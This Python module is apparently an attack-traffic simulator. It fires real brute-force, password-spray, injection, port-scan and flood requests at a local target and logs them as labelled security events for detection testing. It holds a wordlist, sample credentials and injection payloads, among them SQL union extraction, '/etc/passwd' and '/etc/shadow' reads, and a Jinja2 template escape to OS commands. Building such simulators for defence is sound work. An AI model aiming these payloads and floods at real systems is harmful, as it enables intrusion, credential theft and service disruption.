"""
HTTP and Network Attack Engine.

Sends genuine HTTP and TCP requests to the target web application and builds SecurityEvents
from the response status codes and connection states.

Conforms to Group 4 Data Model:
  200 / 201 → status "ok"
  401 / other / connection timeout → status "invalid"
"""

import asyncio
import random
import uuid
import logging
from datetime import datetime, timezone
from typing import Optional, List, Tuple
from urllib.parse import urlparse

import httpx

from simulator.models import SecurityEvent, EventStatus


logger = logging.getLogger("simulator.attack_engine")

# ── Attacker identity pools ───────────────────────────────────────────────────
ATTACKER_IPS = [
    "185.220.101.5", "194.26.29.112", "45.154.255.88",
    "103.251.167.20", "91.240.118.172", "198.51.100.42",
]
SPRAY_IPS = ["194.26.29.112", "91.240.118.172", "103.251.167.20"]
CORP_SUBNETS = ["10.10.1.", "10.10.2.", "172.16.5.", "172.16.8."]

# ── Usernames for credential and spray attacks ───────────────────────────────
ALL_USERNAMES = [
    "admin", "root", "administrator", "sysadmin",
    "deploy", "alice", "bob", "guest", "user", "test",
    "service_account", "operator", "dbadmin", "support", "analyst"
]

# ── Target Correct Credentials ────────────────────────────────────────────────
CORRECT_CREDENTIALS = {
    "admin":         "Admin@1234",
    "root":          "t00r",
    "administrator": "P@ssw0rd!",
    "sysadmin":      "Sysadmin99",
    "deploy":        "deploy123",
    "alice":         "alice2026",
    "bob":           "bob_secure",
}

# ── Common passwords used in horizontal password spray ────────────────────────
COMMON_SPRAY_PASSWORDS = [
    "Admin@1234", "deploy123", "alice2026", "bob_secure",
    "P@ssw0rd!", "Welcome2026!", "Company@123", "Spring2026!", "password123"
]

# ── Large Brute Force Dataset (1,200+ distinct realistic passwords) ───────────
_BASE_WORDS = [
    "password", "admin", "welcome", "login", "pass", "root", "master", "system",
    "shadow", "dragon", "summer", "winter", "spring", "autumn", "server", "oracle",
    "cisco", "guest", "access", "secure", "secret", "hunter", "flower", "monkey",
    "orange", "yellow", "purple", "diamond", "coffee", "portal", "matrix", "doctor",
    "starwars", "superman", "batman", "alpha", "bravo", "charlie", "delta", "echo",
    "foxtrot", "golf", "hotel", "india", "juliet", "kilo", "lima", "mike", "november",
    "oscar", "papa", "quebec", "romeo", "sierra", "tango", "uniform", "victor",
    "whiskey", "xray", "yankee", "zulu"
]
_SUFFIXES = ["123", "1234", "!", "@123", "2024", "2025", "2026", "99", "1", "2026!"]

WORDLIST: List[str] = []
for _w in _BASE_WORDS:
    for _s in _SUFFIXES:
        WORDLIST.append(f"{_w}{_s}")
        WORDLIST.append(f"{_w.capitalize()}{_s}")

WORDLIST = list(set(WORDLIST))

# ── Valid credentials for normal baseline traffic ─────────────────────────────
VALID_CREDENTIALS = {
    "alice": "alice2026",
    "bob":   "bob_secure",
}

# ── Rich Injection Payloads Variety ───────────────────────────────────────────
INJECTION_PAYLOADS: List[Tuple[str, str, str]] = [
    # SQL Injection (Tautology, Union, Error-based, Time-based)
    (
        "/api/search?q=' OR '1'='1' --",
        "sqli_tautology",
        "SQL Injection boolean tautology probe",
    ),
    (
        "/api/search?q=' UNION SELECT username, password FROM users --",
        "sqli_union",
        "SQL Injection union-based data extraction probe",
    ),
    (
        "/api/search?q=' AND 1=CONVERT(int, (SELECT @@version)) --",
        "sqli_error_based",
        "SQL Injection error-based database version probe",
    ),
    (
        "/api/search?q=1; WAITFOR DELAY '0:0:5' --",
        "sqli_blind_time",
        "SQL Injection time-based blind delay probe",
    ),
    # OS Command Injection / RCE
    (
        "/api/search?q=id; cat /etc/passwd",
        "rce_unix_cat",
        "Remote command execution Unix credential probe",
    ),
    (
        "/api/search?q=| whoami",
        "rce_pipe_whoami",
        "Remote command execution privilege probe",
    ),
    (
        "/api/search?q=; powershell -c Get-Process",
        "rce_powershell",
        "Remote command execution PowerShell probe",
    ),
    (
        "/api/search?q=& ping -n 3 127.0.0.1 &",
        "rce_ping_oob",
        "Remote command execution out-of-band probe",
    ),
    # Directory Traversal / LFI
    (
        "/api/search?q=../../../../etc/passwd",
        "path_traversal_linux",
        "Directory traversal /etc/passwd probe",
    ),
    (
        "/api/search?q=../../../../etc/shadow",
        "path_traversal_shadow",
        "Directory traversal /etc/shadow probe",
    ),
    (
        "/api/search?q=..\\..\\..\\windows\\win.ini",
        "path_traversal_win",
        "Directory traversal Windows win.ini probe",
    ),
    (
        "/api/search?q=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts",
        "path_traversal_urlencode",
        "URL-encoded traversal evasion probe",
    ),
    # NoSQL Injection
    (
        "/api/search?q=admin[$ne]=x",
        "nosql_ne_operator",
        "NoSQL not-equal operator injection probe",
    ),
    (
        "/api/search?q=user[$gt]=\"\"",
        "nosql_gt_operator",
        "NoSQL greater-than operator injection probe",
    ),
    (
        "/api/search?q={\"$where\": \"this.password.length > 0\"}",
        "nosql_where_eval",
        "NoSQL Javascript where clause evaluation probe",
    ),
    # Server-Side Template Injection (SSTI)
    (
        "/api/search?q={{7*7}}",
        "ssti_jinja_eval",
        "Server-side template expression evaluation probe",
    ),
    (
        "/api/search?q=${7*7}",
        "ssti_spring_el",
        "Spring Expression Language template probe",
    ),
    (
        "/api/search?q={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "ssti_rce_payload",
        "Jinja2 template escape to OS execution",
    ),
    # Cross-Site Scripting (XSS Probes)
    (
        "/api/search?q=<script>alert('XSS')</script>",
        "xss_script_tag",
        "Reflected cross-site scripting script injection probe",
    ),
    (
        "/api/search?q=\"><img src=x onerror=alert(1)>",
        "xss_img_onerror",
        "Reflected cross-site scripting attribute breakout",
    ),
    # LDAP & Header / CRLF Injection
    (
        "/api/search?q=*)(uid=*))(|(uid=*",
        "ldap_filter_bypass",
        "LDAP filter manipulation probe",
    ),
    (
        "/api/search?q=%0d%0aSet-Cookie:malicious=true",
        "crlf_header_injection",
        "HTTP response splitting and header injection probe",
    ),
]

# ── Benign search queries for normal API traffic ──────────────────────────────
BENIGN_QUERIES = [
    "monthly+report", "user+list", "inventory",
    "orders+2026", "dashboard+stats", "product+catalog",
]


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


def _corp_ip() -> str:
    return f"{random.choice(CORP_SUBNETS)}{random.randint(2, 254)}"


def _dest_from_url(base_url: str) -> str:
    """Extract host:port string from a base URL for use in dest_ip_port field."""
    parsed = urlparse(base_url)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return f"{parsed.hostname}:{port}"


def _status_from_http(code: int) -> EventStatus:
    """
    Only 2 outcomes across the entire platform:
      200, 201 → "ok"
      401, other → "invalid"
    """
    if code in (200, 201):
        return "ok"
    return "invalid"


def _build_auth_event(
    resp: httpx.Response,
    src_ip: str,
    base_url: str,
    username: str,
    password_tried: str,
    attack_type: str,
    is_attack: bool,
) -> SecurityEvent:
    status = _status_from_http(resp.status_code)
    ts = _ts()
    return SecurityEvent(
        event_id=str(uuid.uuid4()),
        event_time=ts,
        ingest_time=ts,
        source_type="auth",
        src_ip=src_ip,
        dest_ip_port=_dest_from_url(base_url),
        user=username,
        status=status,
        raw_payload={
            "attack_type": attack_type,
            "http_status": resp.status_code,
            "auth_method": "password_http",
            "password_tried": password_tried[:3] + "***" if len(password_tried) >= 3 else "***",
            "failure_reason": None if status == "ok" else "invalid_credentials",
            "threat_flag": "malicious" if is_attack else "benign",
            "severity": (
                "CRITICAL" if (is_attack and status == "ok")
                else "HIGH" if is_attack
                else None
            ),
        },
    )


def _build_api_event(
    resp: httpx.Response,
    src_ip: str,
    base_url: str,
    endpoint: str,
    http_method: str,
    attack_type: str,
    signature: Optional[str],
    description: Optional[str],
    is_attack: bool,
    user: Optional[str] = None,
) -> SecurityEvent:
    status = _status_from_http(resp.status_code)
    ts = _ts()
    payload: dict = {
        "attack_type": attack_type,
        "http_method": http_method,
        "endpoint": endpoint,
        "response_code": resp.status_code,
        "threat_flag": "malicious" if is_attack else "benign",
    }
    if signature:
        payload["signature"] = signature
    if description:
        payload["description"] = description
    if is_attack:
        payload["severity"] = "MEDIUM"

    return SecurityEvent(
        event_id=str(uuid.uuid4()),
        event_time=ts,
        ingest_time=ts,
        source_type="api",
        src_ip=src_ip,
        dest_ip_port=_dest_from_url(base_url),
        user=user or ("anonymous" if is_attack else None),
        status=status,
        raw_payload=payload,
    )


# ── Network Probing Ports (includes victim port 8002) ─────────────────────────
SCAN_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
    1433, 3306, 3389, 5432, 6379, 8002, 8080, 8443, 9200, 27017
]


def _build_network_event(
    src_ip: str,
    dest_ip_port: str,
    attack_type: str,
    protocol: str,
    status: EventStatus,
    payload_details: dict,
    is_attack: bool,
) -> SecurityEvent:
    ts = _ts()
    payload = {
        "attack_type": attack_type,
        "protocol": protocol,
        "threat_flag": "malicious" if is_attack else "benign",
        **payload_details,
    }
    if is_attack:
        payload["severity"] = "HIGH"

    return SecurityEvent(
        event_id=str(uuid.uuid4()),
        event_time=ts,
        ingest_time=ts,
        source_type="network",
        src_ip=src_ip,
        dest_ip_port=dest_ip_port,
        user=None,
        status=status,
        raw_payload=payload,
    )


class ScenarioEngine:
    """
    HTTP and Network Attack Engine.
    Manages persistent async HTTP and TCP probes against the target web application.
    """

    def __init__(self):
        self._client: Optional[httpx.AsyncClient] = None

    async def start(self):
        """Open the shared async HTTP client."""
        if self._client is None or self._client.is_closed:
            self._client = httpx.AsyncClient(
                timeout=httpx.Timeout(5.0),
                follow_redirects=True,
            )
            logger.info("Attack engine HTTP client started.")

    async def stop(self):
        """Close the shared async HTTP client."""
        if self._client and not self._client.is_closed:
            await self._client.aclose()
            self._client = None
            logger.info("Attack engine HTTP client stopped.")

    def _client_or_raise(self) -> httpx.AsyncClient:
        if self._client is None or self._client.is_closed:
            self._client = httpx.AsyncClient(
                timeout=httpx.Timeout(5.0),
                follow_redirects=True,
            )
        return self._client

    # ── Auth Attacks (2 scenarios) ────────────────────────────────────────────

    async def generate_auth_brute_force(
        self,
        target_url: str = "http://localhost:8002",
        target_user: str = "admin",
        **_,
    ) -> SecurityEvent:
        """
        Credential Brute Force (Vertical attack).
        Sends POST /login targeting a single account with passwords from the dictionary.
        Exactly 1 in 1000 attempts uses the correct password.
        """
        client = self._client_or_raise()
        attacker_ip = random.choice(ATTACKER_IPS)

        if random.random() < 0.001:
            password = CORRECT_CREDENTIALS.get(target_user, "Admin@1234")
        else:
            password = random.choice(WORDLIST)

        try:
            resp = await client.post(
                f"{target_url}/login",
                json={"username": target_user, "password": password},
            )
        except Exception as exc:
            logger.warning(f"brute_force HTTP error: {exc}")
            resp = httpx.Response(503)

        logger.debug(
            f"BRUTE_FORCE  user={target_user!r}  pwd={password[:3]}***  "
            f"→ HTTP {resp.status_code}"
        )
        return _build_auth_event(
            resp, attacker_ip, target_url,
            target_user, password, "credential_brute_force", is_attack=True,
        )

    async def generate_auth_password_spray(
        self,
        target_url: str = "http://localhost:8002",
        **_,
    ) -> SecurityEvent:
        """
        Horizontal Password Spraying.
        Cycles 1 or 2 common passwords across multiple usernames from rotating spray IPs.
        Evades account lockouts; returns 200 OK when hitting accounts matching common passwords.
        """
        client = self._client_or_raise()
        attacker_ip = random.choice(SPRAY_IPS)
        username = random.choice(ALL_USERNAMES)
        password = random.choice(COMMON_SPRAY_PASSWORDS)

        try:
            resp = await client.post(
                f"{target_url}/login",
                json={"username": username, "password": password},
            )
        except Exception as exc:
            logger.warning(f"password_spray HTTP error: {exc}")
            resp = httpx.Response(503)

        logger.debug(
            f"PASSWORD_SPRAY  user={username!r}  pwd={password[:3]}***  "
            f"→ HTTP {resp.status_code}"
        )
        return _build_auth_event(
            resp, attacker_ip, target_url,
            username, password, "horizontal_password_spray", is_attack=True,
        )

    # ── API Attacks (2 scenarios) ─────────────────────────────────────────────

    async def generate_api_injection_probe(
        self,
        target_url: str = "http://localhost:8002",
        **_,
    ) -> SecurityEvent:
        """
        API Injection Probe across diverse vulnerability classes.
        Sends GET /api/search with SQLi, command injection, path traversal, NoSQL, SSTI, XSS, etc.
        Target processes all queries without filtering, always returning 200 OK.
        """
        client = self._client_or_raise()
        attacker_ip = random.choice(ATTACKER_IPS)
        endpoint, signature, description = random.choice(INJECTION_PAYLOADS)

        try:
            resp = await client.get(f"{target_url}{endpoint}")
        except Exception as exc:
            logger.warning(f"injection HTTP error: {exc}")
            resp = httpx.Response(503)

        logger.debug(
            f"INJECTION  sig={signature!r}  → HTTP {resp.status_code}"
        )
        return _build_api_event(
            resp, attacker_ip, target_url,
            endpoint, "GET", "api_injection_probe",
            signature, description, is_attack=True,
        )

    async def generate_api_rate_limit(
        self,
        target_url: str = "http://localhost:8002",
        concurrency: int = 5,
        **_,
    ) -> SecurityEvent:
        """
        Rate Limit Exhaustion via concurrent request flooding.
        Fires a batch of parallel requests simultaneously using asyncio.gather.
        Target has no rate limiter, returns 200 OK.
        """
        client = self._client_or_raise()
        attacker_ip = "45.154.255.88"
        endpoint = "/api/export"

        async def _send_single_export():
            try:
                return await client.post(
                    f"{target_url}{endpoint}",
                    json={"format": "csv"},
                )
            except Exception as exc:
                logger.warning(f"rate_limit concurrent HTTP error: {exc}")
                return httpx.Response(503)

        # Fire concurrent requests in parallel
        tasks = [_send_single_export() for _ in range(concurrency)]
        responses = await asyncio.gather(*tasks)
        primary_resp = responses[0] if responses else httpx.Response(503)

        logger.debug(f"RATE_LIMIT CONCURRENT FLOOD  concurrency={concurrency} → HTTP {primary_resp.status_code}")
        return _build_api_event(
            primary_resp, attacker_ip, target_url,
            endpoint, "POST", "rate_limit_exhaustion",
            None, f"Concurrent request flood ({concurrency} parallel requests)", is_attack=True,
        )

    # ── Network Attacks (2 scenarios) ─────────────────────────────────────────

    async def generate_network_port_scan(
        self,
        target_url: str = "http://localhost:8002",
        **_,
    ) -> SecurityEvent:
        """
        TCP Port Scan Sweep.
        Attempts full TCP 3-way connection handshakes across common administration and service ports
        (including target victim port 8002) with 0.5s timeout suitable for cloud instances.
        """
        attacker_ip = random.choice(ATTACKER_IPS)
        parsed = urlparse(target_url)
        target_host = parsed.hostname or "127.0.0.1"
        target_app_port = parsed.port or (443 if parsed.scheme == "https" else 80)

        # Ensure active target port is in the pool
        candidate_ports = list(SCAN_PORTS)
        if target_app_port not in candidate_ports:
            candidate_ports.append(target_app_port)

        port = random.choice(candidate_ports)
        dest_str = f"{target_host}:{port}"

        # Real TCP socket connection attempt
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(target_host, port),
                timeout=0.5
            )
            writer.close()
            await writer.wait_closed()
            status: EventStatus = "ok"
            tcp_state = "OPEN"
        except Exception:
            status = "invalid"
            tcp_state = "CLOSED_OR_FILTERED"

        logger.debug(f"PORT_SCAN  dest={dest_str}  state={tcp_state}  → status={status}")
        return _build_network_event(
            src_ip=attacker_ip,
            dest_ip_port=dest_str,
            attack_type="port_scan_sweep",
            protocol="tcp",
            status=status,
            payload_details={
                "port_probed": port,
                "scan_type": "tcp_connect_scan",
                "handshake": "full_connect_3_way",
                "port_state": tcp_state,
                "description": f"TCP port connection sweep probing port {port} ({tcp_state})",
            },
            is_attack=True,
        )

    async def generate_network_connection_flood(
        self,
        target_url: str = "http://localhost:8002",
        concurrency: int = 8,
        **_,
    ) -> SecurityEvent:
        """
        TCP Connection Flood.
        Opens rapid concurrent TCP socket connections against the target host and port
        to test socket connection pool limits and backlog capacity.
        """
        attacker_ip = random.choice(ATTACKER_IPS)
        parsed = urlparse(target_url)
        target_host = parsed.hostname or "127.0.0.1"
        target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
        dest_str = f"{target_host}:{target_port}"

        successful_conns = 0
        failed_conns = 0

        async def _probe_socket():
            nonlocal successful_conns, failed_conns
            try:
                _, writer = await asyncio.wait_for(
                    asyncio.open_connection(target_host, target_port),
                    timeout=0.5
                )
                successful_conns += 1
                await asyncio.sleep(0.01)
                writer.close()
                await writer.wait_closed()
            except Exception:
                failed_conns += 1

        # Fire concurrent socket attempts
        tasks = [_probe_socket() for _ in range(concurrency)]
        await asyncio.gather(*tasks)

        status: EventStatus = "ok" if successful_conns > 0 else "invalid"
        logger.debug(f"TCP_CONN_FLOOD dest={dest_str} success={successful_conns}/{concurrency}")

        return _build_network_event(
            src_ip=attacker_ip,
            dest_ip_port=dest_str,
            attack_type="tcp_connection_flood",
            protocol="tcp",
            status=status,
            payload_details={
                "attack_vector": "socket_backlog_flood",
                "concurrency": concurrency,
                "successful_handshakes": successful_conns,
                "dropped_connections": failed_conns,
                "description": f"Concurrent TCP socket connection flood ({concurrency} sockets) targeting {dest_str}",
            },
            is_attack=True,
        )

    # ── Normal Benign Baseline Traffic ────────────────────────────────────────

    async def generate_normal_auth(
        self,
        target_url: str = "http://localhost:8002",
        **_,
    ) -> SecurityEvent:
        """Send POST /login with valid credentials (status: 'ok')."""
        client = self._client_or_raise()
        src_ip = _corp_ip()
        username, password = random.choice(list(VALID_CREDENTIALS.items()))

        try:
            resp = await client.post(
                f"{target_url}/login",
                json={"username": username, "password": password},
            )
        except Exception as exc:
            logger.warning(f"normal_auth HTTP error: {exc}")
            resp = httpx.Response(503)

        return _build_auth_event(
            resp, src_ip, target_url,
            username, password, "normal_auth", is_attack=False,
        )

    async def generate_normal_api(
        self,
        target_url: str = "http://localhost:8002",
        **_,
    ) -> SecurityEvent:
        """Send GET /api/search with a benign query (status: 'ok')."""
        client = self._client_or_raise()
        src_ip = _corp_ip()
        q = random.choice(BENIGN_QUERIES)
        endpoint = f"/api/search?q={q}"

        try:
            resp = await client.get(f"{target_url}{endpoint}")
        except Exception as exc:
            logger.warning(f"normal_api HTTP error: {exc}")
            resp = httpx.Response(503)

        return _build_api_event(
            resp, src_ip, target_url,
            endpoint, "GET", "normal_api_call",
            None, None, is_attack=False,
        )

    async def generate_normal_network(
        self,
        target_url: str = "http://localhost:8002",
        **_,
    ) -> SecurityEvent:
        """Send normal benign network connection telemetry (status: 'ok')."""
        src_ip = _corp_ip()
        dest_str = _dest_from_url(target_url)
        return _build_network_event(
            src_ip=src_ip,
            dest_ip_port=dest_str,
            attack_type="benign_traffic",
            protocol="tcp",
            status="ok",
            payload_details={
                "traffic_type": "standard_http_handshake",
                "description": "Routine TCP connection established",
            },
            is_attack=False,
        )

    # ── Dispatchers ───────────────────────────────────────────────────────────

    async def generate_random_event(
        self,
        target_url: str = "http://localhost:8002",
        target_user: str = "admin",
        only_attacks: bool = True,
        selected_scenarios: Optional[List[str]] = None,
        attack_ratio: float = 1.0,
        **_,
    ) -> SecurityEvent:
        active_pool = selected_scenarios if selected_scenarios is not None else [
            "auth_brute_force", "auth_password_spray",
            "api_injection_probe", "api_rate_limit",
            "network_port_scan", "network_connection_flood",
        ]

        # If user explicitly cleared all scenarios, return safe benign event
        if not active_pool:
            return await self.generate_normal_auth(target_url=target_url)

        is_attack = only_attacks or (random.random() < attack_ratio)

        if is_attack:
            scenario = random.choice(active_pool)
            return await self.trigger_named_attack(
                scenario, target_url=target_url, target_user=target_user
            )
        else:
            # Baseline traffic strictly matches the categories selected by the user
            has_auth = any(s.startswith("auth_") for s in active_pool)
            has_api = any(s.startswith("api_") for s in active_pool)
            has_net = any(s.startswith("network_") for s in active_pool)

            category_options = []
            if has_auth:
                category_options.append("auth")
            if has_api:
                category_options.append("api")
            if has_net:
                category_options.append("network")

            if not category_options:
                category_options = ["auth"]

            chosen_cat = random.choice(category_options)
            if chosen_cat == "auth":
                return await self.generate_normal_auth(target_url=target_url)
            elif chosen_cat == "api":
                return await self.generate_normal_api(target_url=target_url)
            else:
                return await self.generate_normal_network(target_url=target_url)

    async def trigger_named_attack(
        self,
        scenario_name: str,
        target_url: str = "http://localhost:8002",
        target_user: str = "admin",
        **_,
    ) -> SecurityEvent:
        if scenario_name == "auth_brute_force":
            return await self.generate_auth_brute_force(target_url, target_user)
        elif scenario_name == "auth_password_spray":
            return await self.generate_auth_password_spray(target_url)
        elif scenario_name in ("api_injection_probe", "api_sql_injection"):
            return await self.generate_api_injection_probe(target_url)
        elif scenario_name == "api_rate_limit":
            return await self.generate_api_rate_limit(target_url)
        elif scenario_name == "network_port_scan":
            return await self.generate_network_port_scan(target_url)
        elif scenario_name == "network_connection_flood":
            return await self.generate_network_connection_flood(target_url)
        else:
            logger.warning(f"Unknown scenario '{scenario_name}', defaulting to brute_force.")
            return await self.generate_auth_brute_force(target_url, target_user)
